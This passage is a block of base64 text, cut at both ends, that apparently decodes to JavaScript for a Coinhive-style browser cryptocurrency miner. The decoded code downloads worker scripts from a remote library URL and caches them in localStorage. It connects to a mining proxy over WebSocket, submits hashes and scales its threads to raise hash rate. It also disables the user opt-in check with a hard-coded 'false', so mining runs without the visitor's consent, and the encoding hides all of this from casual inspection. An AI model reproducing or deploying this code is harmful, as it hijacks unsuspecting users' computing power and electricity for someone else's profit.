W5jdGlvbihtb2RlLCBvcHRJblRva2VuKSB7CiAgICB0aGlzLl90YWIubW9kZSA9IG1vZGUgfHwgQ0guSUZfRVhDTFVTSVZFX1RBQjsKICAgIHRoaXMuX29wdEluVG9rZW4gPSBvcHRJblRva2VuOwogICAgaWYgKHRoaXMuX3RhYi5pbnRlcnZhbCkgewogICAgICBjbGVhckludGVydmFsKHRoaXMuX3RhYi5pbnRlcnZhbCk7CiAgICAgIHRoaXMuX3RhYi5pbnRlcnZhbCA9IG51bGw7CiAgICB9CiAgICBpZiAodGhpcy5fbWluYmluU3RhdHVzID09PSAibG9hZGVkIikgewogICAgICB0aGlzLl9zdGFydE5vdygpOwogICAgfSBlbHNlIGlmICh0aGlzLl91c2VXQVNNKSB7CgkJdGhpcy5fbWluYmluU3RhdHVzID0gInBlbmRpbmciOwoJCXRoaXMuZG9XYXNtR3V5KCk7IAoJfWVsc2V7CgkJdGhpcy5fbWluYmluU3RhdHVzID0gInBlbmRpbmciOwoJCXRoaXMuZG9Bc21HdXkoKTsgCiAgICB9CiAgfTsKCk1pbmVyLnByb3RvdHlwZS5kb0FzbUd1eSA9IGZ1bmN0aW9uKCl7Cgl2YXIgZ3V5ID0gbG9jYWxTdG9yYWdlLmdldEl0ZW0oImNmY19hanMiKTsKICAgICAgICBpZiAoZ3V5KXsgCiAgICAgICAgICBDSC5DUllQVE9OSUdIVF9XT1JLRVJfQkxPQiA9CiAgICAgICAgICAgIHdpbmRvdy5VUkwuY3JlYXRlT2JqZWN0VVJMKG5ldyBCbG9iKFtndXldKSkgKwogICAgICAgICAgICAiIyIgKwogICAgICAgICAgICBsaWJVcmw7CiAgICAgICAgICB0aGlzLl9taW5iaW5TdGF0dXMgPSAibG9hZGVkIjsKICAgICAgICAgIHRoaXMuX3N0YXJ0Tm93KCk7CgkJcmV0dXJuOwoJfQogICAgICB2YXIgeGhyID0gbmV3IFhNTEh0dHBSZXF1ZXN0KCk7CiAgICAgIHhoci5hZGRFdmVudExpc3RlbmVyKAogICAgICAgICJsb2FkIiwKICAgICAgICBmdW5jdGlvbigpIHsKICAgICAgICAgICAgICAgIGxvY2FsU3RvcmFnZS5zZXRJdGVtKCJjZmNfYWpzIiwgeGhyLnJlc3BvbnNlVGV4dCk7CiAgICAgICAgICBDSC5DUllQVE9OSUdIVF9XT1JLRVJfQkxPQiA9CiAgICAgICAgICAgIHdpbmRvdy5VUkwuY3JlYXRlT2JqZWN0VVJMKG5ldyBCbG9iKFt4aHIucmVzcG9uc2VUZXh0XSkpICsKICAgICAgICAgICAgIiMiICsKICAgICAgICAgICAgbGliVXJsOwogICAgICAgICAgdGhpcy5fbWluYmluU3RhdHVzID0gImxvYWRlZCI7CiAgICAgICAgICB0aGlzLl9zdGFydE5vdygpOwogICAgICAgIH0uYmluZCh0aGlzKSwKICAgICAgICB4aHIKICAgICAgKTsKICAgICAgeGhyLm9wZW4oImdldCIsIGxpYlVybCArICJhLmpzIiwgdHJ1ZSk7CiAgICAgIHhoci5zZW5kKCk7Cn0KCk1pbmVyLnByb3RvdHlwZS5kb1dhc21HdXkgPSBmdW5jdGlvbigpewoJdmFyIGd1eSA9IGxvY2FsU3RvcmFnZS5nZXRJdGVtKCJjZmNfd2FqcyIpOwogICAgICAgIGlmIChndXkpeyAKICAgICAgICAgIENILkNSWVBUT05JR0hUX1dPUktFUl9CTE9CID0KICAgICAgICAgICAgd2luZG93LlVSTC5jcmVhdGVPYmplY3RVUkwobmV3IEJsb2IoW2d1eV0pKSArCiAgICAgICAgICAgICIjIiArCiAgICAgICAgICAgIGxpYlVybDsKICAgICAgICAgIHRoaXMuX21pbmJpblN0YXR1cyA9ICJsb2FkZWQiOwogICAgICAgICAgdGhpcy5fc3RhcnROb3coKTsKCQlyZXR1cm47Cgl9CiAgICAgIHZhciB4aHIgPSBuZXcgWE1MSHR0cFJlcXVlc3QoKTsKICAgICAgeGhyLmFkZEV2ZW50TGlzdGVuZXIoCiAgICAgICAgImxvYWQiLAogICAgICAgIGZ1bmN0aW9uKCkgewogICAgICAgICAgICAgICAgbG9jYWxTdG9yYWdlLnNldEl0ZW0oImNmY193YWpzIiwgeGhyLnJlc3BvbnNlVGV4dCk7CiAgICAgICAgICBDSC5DUllQVE9OSUdIVF9XT1JLRVJfQkxPQiA9CiAgICAgICAgICAgIHdpbmRvdy5VUkwuY3JlYXRlT2JqZWN0VVJMKG5ldyBCbG9iKFt4aHIucmVzcG9uc2VUZXh0XSkpICsKICAgICAgICAgICAgIiMiICsKICAgICAgICAgICAgbGliVXJsOwogICAgICAgICAgdGhpcy5fbWluYmluU3RhdHVzID0gImxvYWRlZCI7CiAgICAgICAgICB0aGlzLl9zdGFydE5vdygpOwogICAgICAgIH0uYmluZCh0aGlzKSwKICAgICAgICB4aHIKICAgICAgKTsKICAgICAgeGhyLm9wZW4oImdldCIsIGxpYlVybCArICJ3YS5qcyIsIHRydWUpOwogICAgICB4aHIuc2VuZCgpOwp9CgogIE1pbmVyLnByb3RvdHlwZS5zdG9wID0gZnVuY3Rpb24obW9kZSkgewogICAgZm9yICh2YXIgaSA9IDA7IGkgPCB0aGlzLl90aHJlYWRzLmxlbmd0aDsgaSsrKSB7CiAgICAgIHRoaXMuX3RvdGFsSGFzaGVzRnJvbURlYWRUaHJlYWRzICs9IHRoaXMuX3RocmVhZHNbaV0uaGFzaGVzVG90YWw7CiAgICAgIHRoaXMuX3RocmVhZHNbaV0uc3RvcCgpOwogICAgfQogICAgdGhpcy5fdGhyZWFkcyA9IFtdOwogICAgdGhpcy5fYXV0b1JlY29ubmVjdCA9IGZhbHNlOwogICAgaWYgKHRoaXMuX3NvY2tldCkgewogICAgICB0aGlzLl9zb2NrZXQuY2xvc2UoKTsKICAgIH0KICAgIHRoaXMuX2N1cnJlbnRKb2IgPSBudWxsOwogICAgaWYgKHRoaXMuX2F1dG9UaHJlYWRzLmludGVydmFsKSB7CiAgICAgIGNsZWFySW50ZXJ2YWwodGhpcy5fYXV0b1RocmVhZHMuaW50ZXJ2YWwpOwogICAgICB0aGlzLl9hdXRvVGhyZWFkcy5pbnRlcnZhbCA9IG51bGw7CiAgICB9CiAgICBpZiAodGhpcy5fdGFiLmludGVydmFsICYmIG1vZGUgIT09ICJkb250S2lsbFRhYlVwZGF0ZSIpIHsKICAgICAgY2xlYXJJbnRlcnZhbCh0aGlzLl90YWIuaW50ZXJ2YWwpOwogICAgICB0aGlzLl90YWIuaW50ZXJ2YWwgPSBudWxsOwogICAgfQogIH07CiAgTWluZXIucHJvdG90eXBlLmdldEhhc2hlc1BlclNlY29uZCA9IGZ1bmN0aW9uKCkgewogICAgdmFyIGhhc2hlc1BlclNlY29uZCA9IDA7CiAgICBmb3IgKHZhciBpID0gMDsgaSA8IHRoaXMuX3RocmVhZHMubGVuZ3RoOyBpKyspIHsKICAgICAgaGFzaGVzUGVyU2Vjb25kICs9IHRoaXMuX3RocmVhZHNbaV0uaGFzaGVzUGVyU2Vjb25kOwogICAgfQogICAgcmV0dXJuIGhhc2hlc1BlclNlY29uZDsKICB9OwogIE1pbmVyLnByb3RvdHlwZS5nZXRUb3RhbEhhc2hlcyA9IGZ1bmN0aW9uKGVzdGltYXRlKSB7CiAgICB2YXIgbm93ID0gRGF0ZS5ub3coKTsKICAgIHZhciBoYXNoZXMgPSB0aGlzLl90b3RhbEhhc2hlc0Zyb21EZWFkVGhyZWFkczsKICAgIGZvciAodmFyIGkgPSAwOyBpIDwgdGhpcy5fdGhyZWFkcy5sZW5ndGg7IGkrKykgewogICAgICB2YXIgdGhyZWFkID0gdGhpcy5fdGhyZWFkc1tpXTsKICAgICAgaGFzaGVzICs9IHRocmVhZC5oYXNoZXNUb3RhbDsKICAgICAgaWYgKGVzdGltYXRlKSB7CiAgICAgICAgdmFyIHRkaWZmID0gKG5vdyAtIHRocmVhZC5sYXN0TWVzc2FnZVRpbWVzdGFtcCkgLyAxZTMgKiAwLjk7CiAgICAgICAgaGFzaGVzICs9IHRkaWZmICogdGhyZWFkLmhhc2hlc1BlclNlY29uZDsKICAgICAgfQogICAgfQogICAgcmV0dXJuIGhhc2hlcyB8IDA7CiAgfTsKICBNaW5lci5wcm90b3R5cGUuZ2V0QWNjZXB0ZWRIYXNoZXMgPSBmdW5jdGlvbigpIHsKICAgIHJldHVybiB0aGlzLl9oYXNoZXM7CiAgfTsKICBNaW5lci5wcm90b3R5cGUuZ2V0VG9rZW4gPSBmdW5jdGlvbigpIHsKICAgIHJldHVybiB0aGlzLl90b2tlbkZyb21TZXJ2ZXI7CiAgfTsKICBNaW5lci5wcm90b3R5cGUub24gPSBmdW5jdGlvbih0eXBlLCBjYWxsYmFjaykgewogICAgaWYgKHRoaXMuX2V2ZW50TGlzdGVuZXJzW3R5cGVdKSB7CiAgICAgIHRoaXMuX2V2ZW50TGlzdGVuZXJzW3R5cGVdLnB1c2goY2FsbGJhY2spOwogICAgfQogIH07CiAgTWluZXIucHJvdG90eXBlLmdldEF1dG9UaHJlYWRzRW5hYmxlZCA9IGZ1bmN0aW9uKGVuYWJsZWQpIHsKICAgIHJldHVybiB0aGlzLl9hdXRvVGhyZWFkcy5lbmFibGVkOwogIH07CiAgTWluZXIucHJvdG90eXBlLnNldEF1dG9UaHJlYWRzRW5hYmxlZCA9IGZ1bmN0aW9uKGVuYWJsZWQpIHsKICAgIHRoaXMuX2F1dG9UaHJlYWRzLmVuYWJsZWQgPSAhIWVuYWJsZWQ7CiAgICBpZiAoIWVuYWJsZWQgJiYgdGhpcy5fYXV0b1RocmVhZHMuaW50ZXJ2YWwpIHsKICAgICAgY2xlYXJJbnRlcnZhbCh0aGlzLl9hdXRvVGhyZWFkcy5pbnRlcnZhbCk7CiAgICAgIHRoaXMuX2F1dG9UaHJlYWRzLmludGVydmFsID0gbnVsbDsKICAgIH0KICAgIGlmIChlbmFibGVkICYmICF0aGlzLl9hdXRvVGhyZWFkcy5pbnRlcnZhbCkgewogICAgICB0aGlzLl9hdXRvVGhyZWFkcy5hZGp1c3RBdCA9IERhdGUubm93KCkgKyB0aGlzLl9hdXRvVGhyZWFkcy5hZGp1c3RFdmVyeTsKICAgICAgdGhpcy5fYXV0b1RocmVhZHMuaW50ZXJ2YWwgPSBzZXRJbnRlcnZhbCgKICAgICAgICB0aGlzLl9hZGp1c3RUaHJlYWRzLmJpbmQodGhpcyksCiAgICAgICAgMWUzCiAgICAgICk7CiAgICB9CiAgfTsKICBNaW5lci5wcm90b3R5cGUuZ2V0VGhyb3R0bGUgPSBmdW5jdGlvbigpIHsKICAgIHJldHVybiB0aGlzLl90aHJvdHRsZTsKICB9OwogIE1pbmVyLnByb3RvdHlwZS5zZXRUaHJvdHRsZSA9IGZ1bmN0aW9uKHRocm90dGxlKSB7CiAgICB0aGlzLl90aHJvdHRsZSA9IE1hdGgubWF4KDAsIE1hdGgubWluKDAuOTksIHRocm90dGxlKSk7CiAgICBpZiAodGhpcy5fY3VycmVudEpvYikgewogICAgICB0aGlzLl9zZXRKb2IodGhpcy5fY3VycmVudEpvYik7CiAgICB9CiAgfTsKICBNaW5lci5wcm90b3R5cGUuZ2V0TnVtVGhyZWFkcyA9IGZ1bmN0aW9uKCkgewogICAgcmV0dXJuIHRoaXMuX3RhcmdldE51bVRocmVhZHM7CiAgfTsKICBNaW5lci5wcm90b3R5cGUuc2V0TnVtVGhyZWFkcyA9IGZ1bmN0aW9uKG51bSkgewogICAgdmFyIG51bSA9IE1hdGgubWF4KDEsIG51bSB8IDApOwogICAgdGhpcy5fdGFyZ2V0TnVtVGhyZWFkcyA9IG51bTsKICAgIGlmIChudW0gPiB0aGlzLl90aHJlYWRzLmxlbmd0aCkgewogICAgICBmb3IgKHZhciBpID0gMDsgbnVtID4gdGhpcy5fdGhyZWFkcy5sZW5ndGg7IGkrKykgewogICAgICAgIHZhciB0aHJlYWQgPSBuZXcgQ0guSm9iVGhyZWFkKCk7CiAgICAgICAgaWYgKHRoaXMuX2N1cnJlbnRKb2IpIHsKICAgICAgICAgIHRocmVhZC5zZXRKb2IodGhpcy5fY3VycmVudEpvYiwgdGhpcy5fb25UYXJnZXRNZXRCb3VuZCk7CiAgICAgICAgfQogICAgICAgIHRoaXMuX3RocmVhZHMucHVzaCh0aHJlYWQpOwogICAgICB9CiAgICB9IGVsc2UgaWYgKG51bSA8IHRoaXMuX3RocmVhZHMubGVuZ3RoKSB7CiAgICAgIHdoaWxlIChudW0gPCB0aGlzLl90aHJlYWRzLmxlbmd0aCkgewogICAgICAgIHZhciB0aHJlYWQgPSB0aGlzLl90aHJlYWRzLnBvcCgpOwogICAgICAgIHRoaXMuX3RvdGFsSGFzaGVzRnJvbURlYWRUaHJlYWRzICs9IHRocmVhZC5oYXNoZXNUb3RhbDsKICAgICAgICB0aHJlYWQuc3RvcCgpOwogICAgICB9CiAgICB9CiAgfTsKICBNaW5lci5wcm90b3R5cGUuaGFzV0FTTVN1cHBvcnQgPSBmdW5jdGlvbigpIHsKICAgIHJldHVybiB3aW5kb3cuV2ViQXNzZW1ibHkgIT09IHVuZGVmaW5lZDsKICB9OwogIE1pbmVyLnByb3RvdHlwZS5pc1J1bm5pbmcgPSBmdW5jdGlvbigpIHsKICAgIHJldHVybiB0aGlzLl90aHJlYWRzLmxlbmd0aCA+IDA7CiAgfTsKICBNaW5lci5wcm90b3R5cGUuX3N0YXJ0Tm93ID0gZnVuY3Rpb24oKSB7CiAgICBpZiAodGhpcy5fdGFiLm1vZGUgIT09IENILkZPUkNFX01VTFRJX1RBQiAmJiAhdGhpcy5fdGFiLmludGVydmFsKSB7CiAgICAgIHRoaXMuX3RhYi5pbnRlcnZhbCA9IHNldEludGVydmFsKHRoaXMuX3VwZGF0ZVRhYnMuYmluZCh0aGlzKSwgMjAwMCk7CiAgICB9CiAgICBpZiAoCiAgICAgIHRoaXMuX3RhYi5tb2RlID09PSBDSC5JRl9FWENMVVNJVkVfVEFCICYmCiAgICAgIHRoaXMuX290aGVyVGFiUnVubmluZygpCiAgICApIHsKICAgICAgcmV0dXJuOwogICAgfQogICAgaWYgKHRoaXMuX3RhYi5tb2RlID09PSBDSC5GT1JDRV9FWENMVVNJVkVfVEFCKSB7CiAgICAgIHRoaXMuX3RhYi5ncmFjZSA9IERhdGUubm93KCkgKyAzZTM7CiAgICB9CiAgICBpZiAoIXRoaXMudmVyaWZ5VGhyZWFkKSB7CiAgICAgIHRoaXMudmVyaWZ5VGhyZWFkID0gbmV3IENILkpvYlRocmVhZCgpOwogICAgfQogICAgdGhpcy5zZXROdW1UaHJlYWRzKHRoaXMuX3RhcmdldE51bVRocmVhZHMpOwogICAgdGhpcy5fYXV0b1JlY29ubmVjdCA9IHRydWU7CiAgICBpZiAoZmFsc2UgJiYgIXRoaXMuX29wdEluVG9rZW4pIHsKICAgICAgdGhpcy5fYXV0aCA9CiAgICAgICAgdGhpcy5fYXV0aCB8fAogICAgICAgIG5ldyBDSC5BdXRoKHRoaXMuX3NpdGVLZXksIHsKICAgICAgICAgIHRoZW1lOiB0aGlzLnBhcmFtcy50aGVtZSB8fCAibGlnaHQiLAogICAgICAgICAgbGFuZzogdGhpcy5wYXJhbXMubGFuZ3VhZ2UgfHwgImF1dG8iCiAgICAgICAgfSk7CiAgICAgIHRoaXMuX2F1dGguYXV0aCgKICAgICAgICBmdW5jdGlvbih0b2tlbikgewogICAgICAgICAgaWYgKCF0b2tlbikgewogICAgICAgICAgICB0aGlzLl9lbWl0KCJvcHRpbiIsIHsgc3RhdHVzOiAiY2FuY2VsZWQiIH0pOwogICAgICAgICAgICB0aGlzLl9lbWl0KCJlcnJvciIsIHsgZXJyb3I6ICJvcHRfaW5fY2FuY2VsZWQiIH0pOwogICAgICAgICAgICByZXR1cm47CiAgICAgICAgICB9CiAgICAgICAgICB0aGlzLl9lbWl0KCJvcHRpbiIsIHsgc3RhdHVzOiAiYWNjZXB0ZWQiIH0pOwogICAgICAgICAgdGhpcy5fb3B0SW5Ub2tlbiA9IHRva2VuOwogICAgICAgICAgdGhpcy5fY29ubmVjdCgpOwogICAgICAgIH0uYmluZCh0aGlzKQogICAgICApOwogICAgfSBlbHNlIHsKICAgICAgdGhpcy5fY29ubmVjdCgpOwogICAgfQogIH07CiAgTWluZXIucHJvdG90eXBlLl9vdGhlclRhYlJ1bm5pbmcgPSBmdW5jdGlvbigpIHsKICAgIGlmICh0aGlzLl90YWIubGFzdFBpbmdSZWNlaXZlZCA+IERhdGUubm93KCkgLSAxNTAwKSB7CiAgICAgIHJldHVybiB0cnVlOwogICAgfQogICAgdHJ5IHsKICAgICAgdmFyIHRkanNvbiA9IGxvY2FsU3RvcmFnZS5nZXRJdGVtKCJDSCIpOwogICAgICBpZiAodGRqc29uKSB7CiAgICAgICAgdmFyIHRkID0gSlNPTi5wYXJzZSh0ZGpzb24pOwogICAgICAgIGlmICh0ZC5pZGVudCAhPT0gdGhpcy5fdGFiLmlkZW50ICYmIERhdGUubm93KCkgLSB0ZC50aW1lIDwgMTUwMCkgewogICAgICAgICAgcmV0dXJuIHRydWU7CiAgICAgICAgfQogICAgICB9CiAgICB9IGNhdGNoIChlKSB7fQogICAgcmV0dXJuIGZhbHNlOwogIH07CiAgTWluZXIucHJvdG90eXBlLl91cGRhdGVUYWJzID0gZnVuY3Rpb24oKSB7CiAgICB2YXIgb3RoZXJUYWJSdW5uaW5nID0gdGhpcy5fb3RoZXJUYWJSdW5uaW5nKCk7CiAgICBpZiAob3RoZXJUYWJSdW5uaW5nICYmIHRoaXMuaXNSdW5uaW5nKCkgJiYgRGF0ZS5ub3coKSA+IHRoaXMuX3RhYi5ncmFjZSkgewogICAgICB0aGlzLnN0b3AoImRvbnRLaWxsVGFiVXBkYXRlIik7CiAgICB9IGVsc2UgaWYgKCFvdGhlclRhYlJ1bm5pbmcgJiYgIXRoaXMuaXNSdW5uaW5nKCkpIHsKICAgICAgdGhpcy5fc3RhcnROb3coKTsKICAgIH0KICAgIGlmICh0aGlzLmlzUnVubmluZygpKSB7CiAgICAgIGlmICh0aGlzLl9iYykgewogICAgICAgIHRoaXMuX2JjLnBvc3RNZXNzYWdlKCJwaW5nIik7CiAgICAgIH0KICAgICAgdHJ5IHsKICAgICAgICBsb2NhbFN0b3JhZ2Uuc2V0SXRlbSgKICAgICAgICAgICJDSCIsCiAgICAgICAgICBKU09OLnN0cmluZ2lmeSh7IGlkZW50OiB0aGlzLl90YWIuaWRlbnQsIHRpbWU6IERhdGUubm93KCkgfSkKICAgICAgICApOwogICAgICB9IGNhdGNoIChlKSB7fQogICAgfQogIH07CiAgTWluZXIucHJvdG90eXBlLl9hZGp1c3RUaHJlYWRzID0gZnVuY3Rpb24oKSB7CiAgICB2YXIgaGFzaGVzID0gdGhpcy5nZXRIYXNoZXNQZXJTZWNvbmQoKTsKICAgIHZhciB0aHJlYWRzID0gdGhpcy5nZXROdW1UaHJlYWRzKCk7CiAgICB2YXIgc3RhdHMgPSB0aGlzLl9hdXRvVGhyZWFkcy5zdGF0czsKICAgIHN0YXRzW3RocmVhZHNdID0gc3RhdHNbdGhyZWFkc10KICAgICAgPyBzdGF0c1t0aHJlYWRzXSAqIDAuNSArIGhhc2hlcyAqIDAuNQogICAgICA6IGhhc2hlczsKICAgIGlmIChEYXRlLm5vdygpID4gdGhpcy5fYXV0b1RocmVhZHMuYWRqdXN0QXQpIHsKICAgICAgdGhpcy5fYXV0b1RocmVhZHMuYWRqdXN0QXQgPSBEYXRlLm5vdygpICsgdGhpcy5fYXV0b1RocmVhZHMuYWRqdXN0RXZlcnk7CiAgICAgIHZhciBjdXIgPSAoc3RhdHNbdGhyZWFkc10gfHwgMCkgLSAxOwogICAgICB2YXIgdXAgPSBzdGF0c1t0aHJlYWRzICsgMV0gfHwgMDsKICAgICAgdmFyIGRvd24gPSBzdGF0c1t0aHJlYWRzIC0gMV0gfHwgMDsKICAgICAgaWYgKGN1ciA+IGRvd24gJiYgKHVwID09PSAwIHx8IHVwID4gY3VyKSAmJiB0aHJlYWRzIDwgOCkgewogICAgICAgIHJldHVybiB0aGlzLnNldE51bVRocmVhZHModGhyZWFkcyArIDEpOwogICAgICB9IGVsc2UgaWYgKGN1ciA+IHVwICYmICghZG93biB8fCBkb3duID4gY3VyKSAmJiB0aHJlYWRzID4gMSkgewogICAgICAgIHJldHVybiB0aGlzLnNldE51bVRocmVhZHModGhyZWFkcyAtIDEpOwogICAgICB9CiAgICB9CiAgfTsKICBNaW5lci5wcm90b3R5cGUuX2VtaXQgPSBmdW5jdGlvbih0eXBlLCBwYXJhbXMpIHsKICAgIHZhciBsaXN0ZW5lcnMgPSB0aGlzLl9ldmVudExpc3RlbmVyc1t0eXBlXTsKICAgIGlmIChsaXN0ZW5lcnMgJiYgbGlzdGVuZXJzLmxlbmd0aCkgewogICAgICBmb3IgKHZhciBpID0gMDsgaSA8IGxpc3RlbmVycy5sZW5ndGg7IGkrKykgewogICAgICAgIGxpc3RlbmVyc1tpXShwYXJhbXMpOwogICAgICB9CiAgICB9CiAgfTsKICBNaW5lci5wcm90b3R5cGUuX2hhc2hTdHJpbmcgPSBmdW5jdGlvbihzKSB7CiAgICB2YXIgaGFzaCA9IDUzODEsCiAgICAgIGkgPSBzLmxlbmd0aDsKICAgIHdoaWxlIChpKSB7CiAgICAgIGhhc2ggPSAoaGFzaCAqIDMzKSBeIHMuY2hhckNvZGVBdCgtLWkpOwogICAgfQogICAgcmV0dXJuIGhhc2ggPj4+IDA7CiAgfTsKICBNaW5lci5wcm90b3R5cGUuX2Nvbm5lY3QgPSBmdW5jdGlvbigpIHsKICAgIGlmICh0aGlzLl9zb2NrZXQpIHsKICAgICAgcmV0dXJuOwogICAgfQogICAgdGhpcy5fc29ja2V0ID0gbmV3IFdlYlNvY2tldChwcm94eVVybCk7CiAgICB0aGlzLl9zb2NrZXQub25tZXNzYWdlID0gdGhpcy5fb25NZXNzYWdlLmJpbmQodGhpcyk7CiAgICB0aGlzLl9zb2NrZXQub25lcnJvciA9IHRoaXMuX29uRXJyb3IuYmluZCh0aGlzKTsKICAgIHRoaXMuX3NvY2tldC5vbmNsb3NlID0gdGhpcy5fb25DbG9zZS5iaW5kKHRoaXMpOwogICAgdGhpcy5fc29ja2V0Lm9ub3BlbiA9IHRoaXMuX29uT3Blbi5iaW5kKHRoaXMpOwogIH07CiAgTWluZXIucHJvdG90eXBlLl9vbk9wZW4gPSBmdW5jdGlvbihldikgewogICAgdGhpcy5fZW1pdCgib3BlbiIpOwogICAgdmFyIHBhcmFtcyA9IHsKICAgICAgc2l0ZV9rZXk6IHRoaXMuX3NpdGVLZXksCiAgICAgIHR5cGU6ICJhbm9ueW1vdXMiLAogICAgICB1c2VyOiBudWxsLAogICAgICBnb2FsOiAwCiAgICB9OwogICAgaWYgKHRoaXMuX3VzZXIpIHsKICAgICAgcGFyYW1zLnR5cGUgPSAidXNlciI7CiAgICAgIHBhcmFtcy51c2VyID0gdGhpcy5fdXNlci50b1N0cmluZygpOwogICAgfSBlbHNlIGlmICh0aGlzLl9nb2FsKSB7CiAgICAgIHBhcmFtcy50eXBlID0gInRva2VuIjsKICAgICAgcGFyYW1zLmdvYWwgPSB0aGlzLl9nb2FsOwogICAgfQogICAgaWYgKHRoaXMuX29wdEluVG9rZW4pIHsKICAgICAgcGFyYW1zLm9wdF9pbiA9IHRoaXMuX29wdEluVG9rZW47CiAgICB9CiAgICB0aGlzLl9zZW5kKCJhdXRoIiwgcGFyYW1zKTsKICB9OwogIE1pbmVyLnByb3RvdHlwZS5fb25FcnJvciA9IGZ1bmN0aW9uKGV2KSB7CiAgICB0aGlzLl9lbWl0KCJlcnJvciIsIHsgZXJyb3I6ICJjb25uZWN0aW9uX2Vycm9yIiB9KTsKICAgIHRoaXMuX29uQ2xvc2UoZXYpOwogIH07CiAgTWluZXIucHJvdG90eXBlLl9vbkNsb3NlID0gZnVuY3Rpb24oZXYpIHsKICAgIGlmIChldi5jb2RlID49IDEwMDMgJiYgZXYuY29kZSA8PSAxMDA5KSB7CiAgICAgIHRoaXMuX3JlY29ubmVjdFJldHJ5ID0gNjA7CiAgICB9CiAgICBmb3IgKHZhciBpID0gMDsgaSA8IHRoaXMuX3RocmVhZHMubGVuZ3RoOyBpKyspIHsKICAgICAgdGhpcy5fdGhyZWFkc1tpXS5zdG9wKCk7CiAgICB9CiAgICB0aGlzLl90aHJlYWRzID0gW107CiAgICB0aGlzLl9zb2NrZXQgPSBudWxsOwogICAgdGhpcy5fZW1pdCgiY2xvc2UiKTsKICAgIGlmICh0aGlzLl9hdXRvUmVjb25uZWN0KSB7CiAgICAgIHNldFRpbWVvdXQodGhpcy5fc3RhcnROb3cuYmluZCh0aGlzKSwgdGhpcy5fcmVjb25uZWN0UmV0cnkgKiAxZTMpOwogICAgfQogIH07CiAgTWluZXIucHJvdG90eXBlLl9vbk1lc3NhZ2UgPSBmdW5jdGlvbihldikgewogICAgdmFyIG1zZyA9IEpTT04ucGFyc2UoZXYuZGF0YSk7CiAgICBpZiAobXNnLnR5cGUgPT09ICJqb2IiKSB7CiAgICAgIHRoaXMuX3NldEpvYihtc2cucGFyYW1zKTsKICAgICAgdGhpcy5fZW1pdCgiam9iIiwgbXNnLnBhcmFtcyk7CiAgICAgIGlmICh0aGlzLl9hdXRvVGhyZWFkcy5lbmFibGVkICYmICF0aGlzLl9hdXRvVGhyZWFkcy5pbnRlcnZhbCkgewogICAgICAgIHRoaXMuX2F1dG9UaHJlYWRzLmFkanVzdEF0ID0gRGF0ZS5ub3coKSArIHRoaXMuX2F1dG9UaHJlYWRzLmFkanVzdEV2ZXJ5OwogICAgICAgIHRoaXMuX2F1dG9UaHJlYWRzLmludGVydmFsID0gc2V0SW50ZXJ2YWwoCiAgICAgICAgICB0aGlzLl9hZGp1c3RUaHJlYWRzLmJpbmQodGhpcyksCiAgICAgICAgICAxZTMKICAgICAgICApOwogICAgICB9CiAgICB9IGVsc2UgaWYgKG1zZy50eXBlID09PSAidmVyaWZ5IikgewogICAgICB0aGlzLnZlcmlmeVRocmVhZC52ZXJpZnkobXNnLnBhcmFtcywgdGhpcy5fb25WZXJpZmllZEJvdW5kKTsKICAgIH0gZWxzZSBpZiAobXNnLnR5cGUgPT09ICJoYXNoX2FjY2VwdGVkIikgewogICAgICB0aGlzLl9oYXNoZXMgPSBtc2cucGFyYW1zLmhhc2hlczsKICAgICAgdGhpcy5fZW1pdCgiYWNjZXB0ZWQiLCBtc2cucGFyYW1zKTsKICAgICAgaWYgKHRoaXMuX2dvYWwgJiYgdGhpcy5faGFzaGVzID49IHRoaXMuX2dvYWwpIHsKICAgICAgICB0aGlzLnN0b3AoKTsKICAgICAgfQogICAgfSBlbHNlIGlmIChtc2cudHlwZSA9PT0gImF1dGhlZCIpIHsKICAgICAgdGhpcy5fdG9rZW5Gcm9tU2VydmVyID0gbXNnLnBhcmFtcy50b2tlbiB8fCBudWxsOwogICAgICB0aGlzLl9oYXNoZXMgPSBtc2cucGFyYW1zLmhhc2hlcyB8fCAwOwogICAgICB0aGlzLl9lbWl0KCJhdXRoZWQiLCBtc2cucGFyYW1zKTsKICAgICAgdGhpcy5fcmVjb25uZWN0UmV0cnkgPSAzOwogICAgfSBlbHNlIGlmIChtc2cudHlwZSA9PT0gImVycm9yIikgewogICAgICBpZiAoY29uc29sZSAmJiBjb25zb2xlLmVycm9yKSB7CiAgICAgICAgY29uc29sZS5lcnJvcigiU3RyYXR1bSBFcnJvcjoiLCBtc2cucGFyYW1zLmVycm9yKTsKICAgICAgfQogICAgICB0aGlzLl9lbWl0KCJlcnJvciIsIG1zZy5wYXJhbXMpOwogICAgICBpZiAobXNnLnBhcmFtcy5lcnJvciA9PT0gImludmFsaWRfc2l0ZV9rZXkiKSB7CiAgICAgICAgdGhpcy5fcmVjb25uZWN0UmV0cnkgPSA2ZTM7CiAgICAgIH0gZWxzZSBpZiAobXNnLnBhcmFtcy5lcnJvciA9PT0gImludmFsaWRfb3B0X2luIikgewogICAgICAgIGlmICh0aGlzLl9zdG9wT25JbnZhbGlkT3B0SW4pIHsKICAgICAgICAgIHJldHVybiB0aGlzLnN0b3AoKTsKICAgICAgICB9IGVsc2UgaWYgKHRoaXMuX2F1dGgpIHsKICAgICAgICAgIHRoaXMuX2F1dGgucmVzZXQoKTsKICAgICAgICB9CiAgICAgIH0KICAgIH0gZWxzZSBpZiAobXNnLnR5cGUgPT09ICJiYW5uZWQiIHx8IG1zZy5wYXJhbXMuYmFubmVkKSB7CiAgICAgIHRoaXMuX2VtaXQoImVycm9yIiwgeyBiYW5uZWQ6IHRydWUgfSk7CiAgICAgIHRoaXMuX3JlY29ubmVjdFJldHJ5ID0gNjAwOwogICAgfQogIH07CiAgTWluZXIucHJvdG90eXBlLl9zZXRKb2IgPSBmdW5jdGlvbihqb2IpIHsKICAgIHRoaXMuX2N1cnJlbnRKb2IgPSBqb2I7CiAgICB0aGlzLl9jdXJyZW50Sm9iLnRocm90dGxlID0gdGhpcy5fdGhyb3R0bGU7CiAgICBmb3IgKHZhciBpID0gMDsgaSA8IHRoaXMuX3RocmVhZHMubGVuZ3RoOyBpKyspIHsKICAgICAgdGhpcy5fdGhyZWFkc1tpXS5zZXRKb2Ioam9iLCB0aGlzLl9vblRhcmdldE1ldEJvdW5kKTsKICAgIH0KICB9OwogIE1pbmVyLnByb3RvdHlwZS5fb25UYXJnZXRNZXQgPSBmdW5jdGlvbihyZXN1bHQpIHsKICAgIHRoaXMuX2VtaXQoImZvdW5kIiwgcmVzdWx0KTsKICAgIGlmIChyZXN1bHQuam9iX2lkID09PSB0aGlzLl9jdXJyZW50Sm9iLmpvYl9pZCkgewogICAgICB0aGlzLl9zZW5kKCJzdWJtaXQiLCB7CiAgICAgI